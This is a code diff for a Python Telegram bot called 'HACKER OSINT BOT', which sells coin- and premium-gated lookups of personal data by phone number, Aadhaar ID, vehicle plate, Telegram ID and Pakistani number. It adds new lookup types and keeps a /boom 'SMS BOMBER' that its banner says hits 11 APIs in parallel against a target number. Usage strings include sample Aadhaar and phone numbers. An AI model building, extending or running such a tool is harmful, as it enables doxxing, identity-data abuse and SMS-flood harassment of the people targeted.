+        "vehicle_info": L[l]['enter_vehicle'],
+        "special_info": L[l]['enter_special'],
+        "aadhaar_special_info": L[l]['enter_aadhaar_special'],
+        "tg_number_info": L[l]['enter_tg_number'],
+        "pakistan_info": L[l]['enter_pakistan'],
+        "info": L[l]['enter_number']
+    }
+    bot.send_message(c.message.chat.id, prompts.get(c.data, L[l]['enter_number']))
     bot.answer_callback_query(c.id, "🔍")
 
 @bot.callback_query_handler(func=lambda c: c.data.startswith('json_'))
 def json_cb(c):
-    parts = c.data.split('_')[1:]
-    if len(parts) < 1:
+    parts = c.data.split('_')
+    if len(parts) < 3:
         bot.answer_callback_query(c.id, "❌", True); return
-    q = parts[0]
-    is_vehicle = parts[1] == 'True' if len(parts) > 1 else False
-    is_special = parts[2] == 'True' if len(parts) > 2 else False
-    is_aadhaar = parts[3] == 'True' if len(parts) > 3 else False
-    is_number_special = parts[4] == 'True' if len(parts) > 4 else False
-    if is_aadhaar: d = fetch_aadhaar(q)
+    q = parts[1]
+    flags = parts[2] if len(parts) > 2 else "0000000"
+    # Flags: vehicle, special, aadhaar, number_special, aadhaar_special, tg_number, pakistan
+    is_vehicle = len(flags) > 0 and flags[0] == '1'
+    is_special = len(flags) > 1 and flags[1] == '1'
+    is_aadhaar = len(flags) > 2 and flags[2] == '1'
+    is_number_special = len(flags) > 3 and flags[3] == '1'
+    is_aadhaar_special = len(flags) > 4 and flags[4] == '1'
+    is_tg_number = len(flags) > 5 and flags[5] == '1'
+    is_pakistan = len(flags) > 6 and flags[6] == '1'
+
+    if is_aadhaar_special: d = fetch_aadhaar_special(q)
+    elif is_pakistan: d = fetch_pakistan(q)
+    elif is_tg_number: d = fetch_tg_number(q)
+    elif is_aadhaar: d = fetch_aadhaar(q)
+    elif is_number_special: d = fetch_special(q)
     elif is_special: d = fetch_vehicle_special(q)
     elif is_vehicle: d = fetch_vehicle(q)
-    elif is_number_special: d = fetch_number_special(q)
     else: d = fetch_number(q)
+
     if not d:
         bot.answer_callback_query(c.id, "❌", True); return
     bot.answer_callback_query(c.id, "📊")
     try:
         jtext = json.dumps(d, indent=2, ensure_ascii=False)
         if len(jtext) > 3800: jtext = jtext[:3800] + "\n... (truncated)"
-        bot.send_message(c.message.chat.id, f"`📊 JSON OUTPUT\n\n{jtext}`", parse_mode='Markdown')
+        bot.send_message(c.message.chat.id, f"`📊 JSON\n\n{jtext}`", parse_mode='Markdown')
     except:
         bot.send_message(c.message.chat.id, f"📊 JSON:\n`{str(d)[:3500]}`", parse_mode='Markdown')
 
@@ -752,11 +757,12 @@ def pin_callback(c):
         message_id = int(c.data.split('_')[1])
         bot.pin_chat_message(c.message.chat.id, message_id)
         bot.answer_callback_query(c.id, "📌 Pinned!", show_alert=False)
-        bot.send_message(c.message.chat.id, "📌 Message Pinned!")
+        bot.send_message(c.message.chat.id, "📌 Pinned!")
     except: bot.answer_callback_query(c.id, "❌ Pin failed!", True)
 
-# ==================== PROCESS QUERY (FAST PARALLEL) ====================
-def process_query(m, q, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False):
+# ==================== PROCESS QUERY ====================
+def process_query(m, q, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False,
+                  is_aadhaar_special=False, is_tg_number=False, is_pakistan=False):
     l = gl(m.from_user.id)
     ensure_user(m.from_user.id, m.from_user.first_name or "User", m.from_user.username or "")
     is_premium_user = ip(m.from_user.id)
@@ -765,75 +771,83 @@ def process_query(m, q, is_vehicle=False, is_special=False, is_aadhaar=False, is
         coins = gc(m.from_user.id)
         if coins <= 0:
             mk = InlineKeyboardMarkup(row_width=1)
-            mk.add(InlineKeyboardButton("🎁 Claim 1 FREE Coin", callback_data="claim_coin"))
+            mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
             mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
-            bot.reply_to(m, "❌ **No Coins Left!**\n\n🎁 Claim daily 1 FREE Coin", reply_markup=mk, parse_mode='Markdown')
+            bot.reply_to(m, "❌ **No Coins!** Claim daily FREE coin.", reply_markup=mk, parse_mode='Markdown')
             return
         if not dc(m.from_user.id):
             bot.reply_to(m, L[l]['nc'], reply_markup=main_menu(l))
             return
 
-    if is_aadhaar: stype = "AADHAAR"
-    elif is_special: stype = "VEHICLE SPECIAL"
+    if is_aadhaar_special: stype = "AADHAAR SPL"
+    elif is_pakistan: stype = "PAKISTAN"
+    elif is_tg_number: stype = "TG-NUMBER"
+    elif is_aadhaar: stype = "AADHAAR"
+    elif is_number_special: stype = "SPECIAL"
+    elif is_special: stype = "VEHICLE SPL"
     elif is_vehicle: stype = "VEHICLE"
-    elif is_number_special: stype = "NUMBER NORMAL"
-    else: stype = "NUMBER SPECIAL"
+    else: stype = "NUMBER"
 
-    # Fetch data in BACKGROUND while animation plays
+    # Build flags string
+    flags = f"{int(is_vehicle)}{int(is_special)}{int(is_aadhaar)}{int(is_number_special)}{int(is_aadhaar_special)}{int(is_tg_number)}{int(is_pakistan)}"
+
+    # PARALLEL fetch
     data_holder = {"d": None}
-    
     def fetch_data():
-        if is_aadhaar: data_holder["d"] = fetch_aadhaar(q)
+        if is_aadhaar_special: data_holder["d"] = fetch_aadhaar_special(q)
+        elif is_pakistan: data_holder["d"] = fetch_pakistan(q)
+        elif is_tg_number: data_holder["d"] = fetch_tg_number(q)
+        elif is_aadhaar: data_holder["d"] = fetch_aadhaar(q)
+        elif is_number_special: data_holder["d"] = fetch_special(q)
         elif is_special: data_holder["d"] = fetch_vehicle_special(q)
         elif is_vehicle: data_holder["d"] = fetch_vehicle(q)
-        elif is_number_special: data_holder["d"] = fetch_number_special(q)
         else: data_holder["d"] = fetch_number(q)
-    
+
     fetch_thread = threading.Thread(target=fetch_data, daemon=True)
     fetch_thread.start()
-    
+
     try: msg = bot.reply_to(m, "`💻 INITIALIZING...`", parse_mode='Markdown')
     except: msg = bot.reply_to(m, "💻 INITIALIZING...")
-    
+
     try: hacker_loading(m.chat.id, msg.message_id, q, stype)
     except: pass
-    
-    fetch_thread.join(timeout=15)
+
+    fetch_thread.join(timeout=12)
     d = data_holder["d"]
 
     if m.from_user.id == ADMIN_ID:
-        try: bot.send_message(ADMIN_ID, f"🔍 **RAW API** `{q}`:\n```json\n{json.dumps(d, indent=2)}\n```", parse_mode='Markdown')
+        try: bot.send_message(ADMIN_ID, f"🔍 **RAW** `{q}`:\n```json\n{json.dumps(d, indent=2)[:3500]}\n```", parse_mode='Markdown')
         except: pass
 
     if not d:
-        try: bot.edit_message_text(f"`❌ ACCESS DENIED`\n\n`> Target: {q}`\n`> Reason: No data / API error`", m.chat.id, msg.message_id, parse_mode='Markdown')
-        except: bot.send_message(m.chat.id, "❌ API returned empty or error.")
+        try: bot.edit_message_text(f"`❌ ACCESS DENIED`\n\n`> {q}`\n`> No data / API error`", m.chat.id, msg.message_id, parse_mode='Markdown')
+        except: bot.send_message(m.chat.id, "❌ No data / API error.")
         return
 
-    send_log(m.from_user.id, m.from_user.username, q, d, is_vehicle, is_special, is_aadhaar, is_number_special)
-    res = format_result(d, q, is_vehicle, is_special, is_aadhaar, is_number_special)
+    send_log(m.from_user.id, m.from_user.username, q, d, stype)
+    res = format_result(d, q, is_vehicle, is_special, is_aadhaar, is_number_special, is_aadhaar_special, is_tg_number, is_pakistan)
 
     try:
         bot.edit_message_text(
             f"`╔══════════════════════════════╗`\n"
-            f"`║  💚 ACCESS GRANTED SUCCESS 💚║`\n"
+            f"`║  💚 ACCESS GRANTED 💚        ║`\n"
             f"`╚══════════════════════════════╝`\n"
-            f"`🎯 TARGET : {q}`\n"
-            f"`🔒 STATUS : ✅ DECRYPTED`\n"
+            f"`🎯 {q}`\n"
             f"{res}",
             m.chat.id, msg.message_id, parse_mode='Markdown'
         )
         is_group = m.chat.type in ['group', 'supergroup']
-        markup = result_btn(q, l, is_vehicle, is_special, is_aadhaar, is_number_special, msg.message_id if is_group else None, is_group)
+        markup = result_btn(q, l, flags, msg.message_id if is_group else None, is_group)
         bot.edit_message_reply_markup(m.chat.id, msg.message_id, reply_markup=markup)
     except Exception as e:
         bot.send_message(m.chat.id, f"Error: {e}")
         return
 
+    # Auto JSON
     try:
         jtext = json.dumps(d, indent=2, ensure_ascii=False)
         if len(jtext) > 3600: jtext = jtext[:3600] + "\n... (truncated)"
-        bot.send_message(m.chat.id, f"`📊 JSON OUTPUT for {q}`\n\n```json\n{jtext}\n```", parse_mode='Markdown')
+        bot.send_message(m.chat.id, f"`📊 JSON for {q}`\n\n```json\n{jtext}\n```", parse_mode='Markdown')
     except:
         try: bot.send_message(m.chat.id, f"📊 JSON:\n`{str(d)[:3500]}`", parse_mode='Markdown')
         except: pass
@@ -855,7 +869,7 @@ def myid_cmd(m):
     un = m.from_user.username or "N/A"
     fn = m.from_user.first_name or "N/A"
     ensure_user(uid, fn, un)
-    bot.reply_to(m, f"🆔 **Your Telegram Info**\n\n👤 Name: {fn}\n📛 Username: @{un}\n🆔 **User ID:** `{uid}`\n\n📌 Send this ID to admin.", parse_mode='Markdown')
+    bot.reply_to(m, f"🆔 **Your Telegram Info**\n\n👤 {fn}\n📛 @{un}\n🆔 **ID:** `{uid}`\n\n📌 Send to admin for Premium/Coins.", parse_mode='Markdown')
 
 @bot.message_handler(commands=['boom', 'bomber', 'smsbomb'])
 def boom_cmd(m):
@@ -865,17 +879,17 @@ def boom_cmd(m):
         mk = InlineKeyboardMarkup(row_width=1)
         mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
         mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
-        bot.reply_to(m, "🔒 **SMS BOMBER — Premium Only**\n\n💎 Premium required!", reply_markup=mk, parse_mode='Markdown')
+        bot.reply_to(m, "🔒 **SMS BOMBER — Premium Only**", reply_markup=mk, parse_mode='Markdown')
         return
     parts = m.text.split(maxsplit=2)
     if len(parts) == 1:
         BOMBER_STATE[uid] = {"step": "number", "number": "", "message": ""}
-        bot.reply_to(m, "💥 **SMS BOMBER**\n\n📱 Send 10-digit number:\nExample: `9876543210`\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')
+        bot.reply_to(m, "💥 **SMS BOMBER**\n\n📱 Send 10-digit number:\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')
         return
     if len(parts) == 2:
         number = parts[1].strip()
         if not is_valid_number(number):
-            bot.reply_to(m, "❌ Invalid number! Send 10-digit valid number."); return
+            bot.reply_to(m, "❌ Invalid number!"); return
         BOMBER_STATE[uid] = {"step": "message", "number": number, "message": ""}
         bot.reply_to(m, f"✅ Number: `{number}`\n\n💬 Now send Message:", parse_mode='Markdown')
         return
@@ -884,7 +898,7 @@ def boom_cmd(m):
     if not is_valid_number(number):
         bot.reply_to(m, "❌ Invalid number!"); return
     if len(message) < 1 or len(message) > 200:
-        bot.reply_to(m, "❌ Message must be 1-200 chars!"); return
+        bot.reply_to(m, "❌ Message 1-200 chars!"); return
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(InlineKeyboardButton("🚀 LAUNCH", callback_data="bomber_confirm_direct"), InlineKeyboardButton("❌ Cancel", callback_data="bomber_cancel"))
     BOMBER_STATE[uid] = {"step": "confirm", "number": number, "message": message}
@@ -899,15 +913,13 @@ def bomber_input_handler(m):
     if step == "number":
         if not is_valid_number(text):
             bot.reply_to(m, "❌ Invalid number!"); return
-        state["number"] = text
-        state["step"] = "message"
+        state["number"] = text; state["step"] = "message"
         BOMBER_STATE[uid] = state
         bot.reply_to(m, f"✅ Number: `{text}`\n\n💬 Send Message:", parse_mode='Markdown')
     elif step == "message":
         if len(text) < 1 or len(text) > 200:
             bot.reply_to(m, "❌ 1-200 chars!"); return
-        state["message"] = text
-        state["step"] = "confirm"
+        state["message"] = text; state["step"] = "confirm"
         BOMBER_STATE[uid] = state
         mk = InlineKeyboardMarkup(row_width=2)
         mk.add(InlineKeyboardButton("🚀 LAUNCH", callback_data="bomber_confirm"), InlineKeyboardButton("❌ Cancel", callback_data="bomber_cancel"))
@@ -917,78 +929,116 @@ def bomber_input_handler(m):
 def nc(m):
     p = m.text.split()
     if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_number']); return
-    process_query(m, p[1].strip(), False, False, False, False)
+    process_query(m, p[1].strip())
+
+@bot.message_handler(commands=['special'], chat_types=['private'])
+def special_cmd(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "🔍 Send number for Special:"); return
+    process_query(m, p[1].strip(), is_number_special=True)
+
+@bot.message_handler(commands=['tgnumber', 'tg'], chat_types=['private'])
+def tg_number_cmd(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "📞 Send Telegram ID:"); return
+    process_query(m, p[1].strip(), is_tg_number=True)
+
+@bot.message_handler(commands=['aadharspecial', 'aspecial'], chat_types=['private'])
+def aadhaar_special_cmd(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "🆔 Send 12-digit Aadhaar:"); return
+    process_query(m, p[1].strip(), is_aadhaar_special=True)
+
+@bot.message_handler(commands=['pakistan', 'pk'], chat_types=['private'])
+def pakistan_cmd(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "🇵🇰 Send Pakistan number:"); return
+    process_query(m, p[1].strip(), is_pakistan=True)
 
 @bot.message_handler(commands=['vehicle', 'v'], chat_types=['private'])
 def vc(m):
     p = m.text.split()
     if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_vehicle']); return
-    process_query(m, p[1].strip(), True, False, False)
+    process_query(m, p[1].strip(), is_vehicle=True)
 
 @bot.message_handler(commands=['vehiclespecial', 'vs'], chat_types=['private'])
 def vsc(m):
     p = m.text.split()
     if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_vehicle_special']); return
-    process_query(m, p[1].strip(), False, True, False)
+    process_query(m, p[1].strip(), is_special=True)
 
 @bot.message_handler(commands=['aadhaar', 'aadhar'], chat_types=['private'])
 def acmd(m):
     p = m.text.split()
     if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_aadhaar']); return
-    process_query(m, p[1].strip(), False, False, True)
+    process_query(m, p[1].strip(), is_aadhaar=True)
 
-@bot.message_handler(commands=['special', 's'], chat_types=['private'])
-def special_cmd(m):
-    p = m.text.split()
-    if len(p) < 2: bot.reply_to(m, "❌ /special 9661756498"); return
-    phone = p[1].strip()
-    if not re.match(r'^\d{10}$', phone): bot.reply_to(m, "❌ 10-digit number!"); return
-    process_query(m, phone, False, False, False, True)
+# Auto-detect private
+@bot.message_handler(func=lambda m: re.match(r'^0\d{10}$', m.text or '') and BOMBER_STATE.get(m.from_user.id, {}).get("step") not in ["number", "message"], chat_types=['private'])
+def pkn(m): process_query(m, m.text.strip(), is_pakistan=True)
 
 @bot.message_handler(func=lambda m: re.match(r'^\d{10}$', m.text or '') and BOMBER_STATE.get(m.from_user.id, {}).get("step") not in ["number", "message"], chat_types=['private'])
-def hn(m): process_query(m, m.text.strip(), False, False, False, False)
+def hn(m): process_query(m, m.text.strip())
 
 @bot.message_handler(func=lambda m: re.match(r'^[A-Z]{2}\d{2}[A-Z]{0,2}\d{4}$', (m.text or '').upper()), chat_types=['private'])
-def vhn(m): process_query(m, m.text.strip().upper(), True, False, False)
+def vhn(m): process_query(m, m.text.strip().upper(), is_vehicle=True)
 
 @bot.message_handler(func=lambda m: re.match(r'^\d{12}$', m.text or ''), chat_types=['private'])
-def ahn(m): process_query(m, m.text.strip(), False, False, True)
+def ahn(m): process_query(m, m.text.strip(), is_aadhaar=True)
 
-# ==================== GROUP ====================
+# ==================== GROUP COMMANDS ====================
 @bot.message_handler(commands=['num'], chat_types=['group', 'supergroup'])
 def gn(m):
     p = m.text.split()
     if len(p) < 2: bot.reply_to(m, "❌ /num 9661756498"); return
-    process_query(m, p[1].strip(), False, False, False, False)
-
-@bot.message_handler(commands=['vehicle'], chat_types=['group', 'supergroup'])
-def gv(m):
-    p = m.text.split()
-    if len(p) < 2: bot.reply_to(m, "❌ /vehicle RJ14CV0002"); return
-    process_query(m, p[1].strip().upper(), True, False, False)
-
-@bot.message_handler(commands=['vehiclespecial'], chat_types=['group', 'supergroup'])
-def gvs(m):
-    p = m.text.split()
-    if len(p) < 2: bot.reply_to(m, "❌ /vehiclespecial RJ14CV0002"); return
-    process_query(m, p[1].strip().upper(), False, True, False)
-
-@bot.message_handler(commands=['aadhaar'], chat_types=['group', 'supergroup'])
-def gaadhaar(m):
-    p = m.text.split()
-    if len(p) < 2: bot.reply_to(m, "❌ /aadhaar 962397300673"); return
-    process_query(m, p[1].strip(), False, False, True)
+    process_query(m, p[1].strip())
 
 @bot.message_handler(commands=['special'], chat_types=['group', 'supergroup'])
 def gspecial(m):
     p = m.text.split()
     if len(p) < 2: bot.reply_to(m, "❌ /special 9661756498"); return
-    process_query(m, p[1].strip(), False, False, False, True)
+    process_query(m, p[1].strip(), is_number_special=True)
+
+@bot.message_handler(commands=['vehicle'], chat_types=['group', 'supergroup'])
+def gv(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "❌ /vehicle RJ14CV0002"); return
+    process_query(m, p[1].strip().upper(), is_vehicle=True)
+
+@bot.message_handler(commands=['vehiclespecial'], chat_types=['group', 'supergroup'])
+def gvs(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "❌ /vehiclespecial RJ14CV0002"); return
+    process_query(m, p[1].strip().upper(), is_special=True)
+
+@bot.message_handler(commands=['aadhaar'], chat_types=['group', 'supergroup'])
+def gaadhaar(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "❌ /aadhaar 962397300673"); return
+    process_query(m, p[1].strip(), is_aadhaar=True)
+
+@bot.message_handler(commands=['aadharspecial'], chat_types=['group', 'supergroup'])
+def gaadharspl(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "❌ /aadharspecial 254944943909"); return
+    process_query(m, p[1].strip(), is_aadhaar_special=True)
+
+@bot.message_handler(commands=['tgnumber'], chat_types=['group', 'supergroup'])
+def gtgnum(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "❌ /tgnumber 6936978343"); return
+    process_query(m, p[1].strip(), is_tg_number=True)
+
+@bot.message_handler(commands=['pakistan'], chat_types=['group', 'supergroup'])
+def gpak(m):
+    p = m.text.split()
+    if len(p) < 2: bot.reply_to(m, "❌ /pakistan 03359736848"); return
+    process_query(m, p[1].strip(), is_pakistan=True)
 
 @bot.message_handler(commands=['start', 'help'], chat_types=['group', 'supergroup'])
 def gs(m):
     l = gl(m.from_user.id)
-    bot.reply_to(m, "👋 /num | /vehicle | /vehiclespecial | /aadhaar | /special\n💥 /boom\n💎 1D ₹10, 1W ₹60, 1M ₹101", reply_markup=group_menu(l))
+    bot.reply_to(m, "👋 /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom\n💎 1D ₹10, 1W ₹60, 1M ₹101", reply_markup=group_menu(l))
 
 # ==================== GENERAL ====================
 @bot.message_handler(commands=['menu'])
@@ -1029,26 +1079,24 @@ def pr2(m):
     try:
         cur = conn.cursor()
         cur.execute("SELECT searches FROM users WHERE user_id=?", (uid,))
-        r = cur.fetchone()
-        searches = r[0] if r else 0
+        r = cur.fetchone(); searches = r[0] if r else 0
     except: pass
     l = gl(uid)
     bot.reply_to(m, L[l]['profile'].format(uid=uid, coins=coins, prem=prem, searches=searches), parse_mode='Markdown')
 
 @bot.message_handler(commands=['contact'])
-def ct(m): bot.reply_to(m, f"📞 {OWNER}\n🔗 {GROUP}\n🌐 {WEBSITE}")
+def ct(m): bot.reply_to(m, f"📞 {OWNER}\n🌐 {WEBSITE}")
 
 @bot.message_handler(commands=['clear'])
 def clear_cmd(m):
     try:
         bot.delete_message(m.chat.id, m.message_id)
-        bot.reply_to(m, "🗑️ Cleared!")
-    except: bot.reply_to(m, "❌ Can't clear!")
+        bot.reply_to(m, "🗑️")
+    except: bot.reply_to(m, "❌")
 
 @bot.message_handler(commands=['help'], chat_types=['private'])
 def hp(m):
-    l = gl(m.from_user.id)
-    bot.reply_to(m, L[l]['help'], parse_mode='Markdown')
+    bot.reply_to(m, L[gl(m.from_user.id)]['help'], parse_mode='Markdown')
 
 @bot.message_handler(commands=['language', 'lang'])
 def lg(m):
@@ -1056,14 +1104,14 @@ def lg(m):
 
 @bot.message_handler(commands=['website', 'site'])
 def wsite(m):
-    bot.reply_to(m, f"🌐 **Official Website**\n\n👉 {WEBSITE}",
-                 reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🌐 Visit cyberwithranjan.in", url=WEBSITE)),
+    bot.reply_to(m, f"🌐 **Website**\n👉 {WEBSITE}",
+                 reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🌐 Visit", url=WEBSITE)),
                  parse_mode='Markdown')
 
 @bot.message_handler(commands=['pin'])
 def pin_command(m):
     if m.from_user.id != ADMIN_ID:
-        bot.reply_to(m, L['en']['admin_only']); return
+        bot.reply_to(m, "⚠️ Not authorized."); return
     if m.reply_to_message:
         try:
             bot.pin_chat_message(m.chat.id, m.reply_to_message.message_id)
@@ -1079,7 +1127,7 @@ def ap2(m):
         _, uid, days = m.text.split()
         uid_int = int(uid); days_int = int(days)
         if ap(uid_int, days_int):
-            bot.reply_to(m, f"✅ Premium → `{uid_int}` for {days_int} days", parse_mode='Markdown')
+            bot.reply_to(m, f"✅ Premium → `{uid_int}` ({days_int}d)", parse_mode='Markdown')
             try: bot.send_message(uid_int, f"🎉 **Premium Activated!**\n⏰ {days_int} days", parse_mode='Markdown')
             except: pass
     except: bot.reply_to(m, "❌ /addpremium [uid] [days]")
@@ -1090,7 +1138,7 @@ def rp(m):
     try:
         _, uid = m.text.split()
         c.execute("UPDATE users SET premium=0, premium_expiry=NULL WHERE user_id=?", (int(uid),)); conn.commit()
-        bot.reply_to(m, f"✅ Removed premium from `{uid}`", parse_mode='Markdown')
+        bot.reply_to(m, f"✅ Removed from `{uid}`", parse_mode='Markdown')
     except: bot.reply_to(m, "❌ /removepremium [uid]")
 
 @bot.message_handler(commands=['addcoins'])
@@ -1101,7 +1149,7 @@ def ac(m):
         uid_int = int(uid); coins_int = int(coins)
         new_coins = add_coins_db(uid_int, coins_int)
         bot.reply_to(m, f"✅ Coins → `{uid_int}`\n🪙 Total: **{new_coins}**", parse_mode='Markdown')
-        try: bot.send_message(uid_int, f"🪙 **+{coins_int} Coins!**\nTotal: **{new_coins}**", parse_mode='Markdown')
+        try: bot.send_message(uid_int, f"🪙 **+{coins_int} Coins!** Total: {new_coins}", parse_mode='Markdown')
         except: pass
     except: bot.reply_to(m, "❌ /addcoins [uid] [coins]")
 
@@ -1114,10 +1162,8 @@ def userinfo_cmd(m):
         cur = conn.cursor()
         cur.execute("SELECT user_id, first_name, username, coins, premium, premium_expiry, searches FROM users WHERE user_id=?", (uid_int,))
         r = cur.fetchone()
-        if not r:
-            bot.reply_to(m, f"❌ User not in DB.", parse_mode='Markdown'); return
-        prem_status = "✅ YES" if ip(uid_int) else "❌ NO"
-        bot.reply_to(m, f"👤 ID: `{r[0]}`\n👤 {r[1]}\n@ {r[2] or 'N/A'}\n🪙 {r[3]}\n💎 {prem_status}\n📅 {r[5] or 'N/A'}\n🔍 {r[6]}", parse_mode='Markdown')
+        if not r: bot.reply_to(m, "❌ User not in DB."); return
+        bot.reply_to(m, f"👤 ID: `{r[0]}`\n👤 {r[1]}\n@ {r[2] or 'N/A'}\n🪙 {r[3]}\n💎 {'✅' if ip(uid_int) else '❌'}\n🔍 {r[6]}", parse_mode='Markdown')
     except: bot.reply_to(m, "❌ /userinfo [uid]")
 
 @bot.message_handler(commands=['users'])
@@ -1127,9 +1173,9 @@ def us(m):
         c.execute("SELECT user_id, username, coins, premium FROM users ORDER BY user_id DESC LIMIT 20")
         users = c.fetchall()
         if not users: bot.reply_to(m, "No users."); return
-        text = "📋 **Last 20:**\n\n"
+        text = "📋 **Users:**\n"
         for u in users:
-            text += f"🆔 `{u[0]}` | @{u[1] or 'N/A'} | 🪙{u[2]} | {'💎' if u[3] else ''}\n"
+            text += f"🆔 `{u[0]}` @{u[1] or 'N/A'} 🪙{u[2]} {'💎' if u[3] else ''}\n"
         bot.reply_to(m, text, parse_mode='Markdown')
     except: pass
 
@@ -1158,34 +1204,38 @@ def broadcast(m):
                 bot.send_message(uid[0], "📢 **Announcement**\n\n" + msg, parse_mode='Markdown')
                 sent += 1
             except: pass
-        bot.reply_to(m, f"✅ Sent to {sent} users!")
-    except Exception as e: bot.reply_to(m, f"❌ Error: {e}")
+        bot.reply_to(m, f"✅ Sent to {sent}!")
+    except Exception as e: bot.reply_to(m, f"❌ {e}")
 
 @bot.message_handler(commands=['testapi'])
 def test_api(m):
     if m.from_user.id != ADMIN_ID: return
     parts = m.text.split()
-    if len(parts) < 3: bot.reply_to(m, "❌ /testapi aadhaar 123456789012"); return
+    if len(parts) < 3: bot.reply_to(m, "❌ /testapi [type] [value]\nTypes: num, special, tg, aadharspl, pk, aadhaar"); return
     typ = parts[1].lower(); val = parts[2].strip()
     if typ == "num": data = fetch_number(val)
+    elif typ == "special": data = fetch_special(val)
+    elif typ == "tg": data = fetch_tg_number(val)
+    elif typ == "aadharspl": data = fetch_aadhaar_special(val)
+    elif typ == "pk": data = fetch_pakistan(val)
     elif typ == "aadhaar": data = fetch_aadhaar(val)
-    else: bot.reply_to(m, "❌ Use 'num' or 'aadhaar'"); return
-    if data: bot.reply_to(m, f"✅ **Response:**\n```json\n{json.dumps(data, indent=2)}\n```", parse_mode='Markdown')
-    else: bot.reply_to(m, "❌ No data or error.")
+    else: bot.reply_to(m, "❌ Invalid type"); return
+    if data: bot.reply_to(m, f"✅ ```json\n{json.dumps(data, indent=2)[:3500]}\n```", parse_mode='Markdown')
+    else: bot.reply_to(m, "❌ No data")
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
     print("=" * 55)
-    print("🔥 HACKER OSINT BOT v3.0 — FAST + OPTIMIZED")
+    print("🔥 HACKER OSINT BOT v3.0 — FINAL")
     print("=" * 55)
     print(f"👨‍💻 Owner: {OWNER}")
     print(f"🌐 Website: {WEBSITE}")
     print("-" * 55)
-    print("✅ FAST hacker loading (5 steps × 0.2s = 1 sec)")
-    print("✅ PARALLEL API fetch (while animation plays)")
-    print("✅ PARALLEL SMS bombing (all 11 APIs at once)")
-    print("✅ /num + /special → same API")
-    print("✅ /aadhaar → new API")
-    print("✅ /boom → SMS Bomber")
+    print("✅ 8 Search Types: num, special, tg, aadharspl, pk, vehicle, vspecial, aadhaar")
+    print("✅ Fast: 4-step animation (0.15s each)")
+    print("✅ Parallel API fetch")
+    print("✅ SMS Bomber (11 APIs)")
+    print("✅ 6 Languages")
+    print("✅ Premium + Coins")
     print("=" * 55)
     bot.infinity_polling()
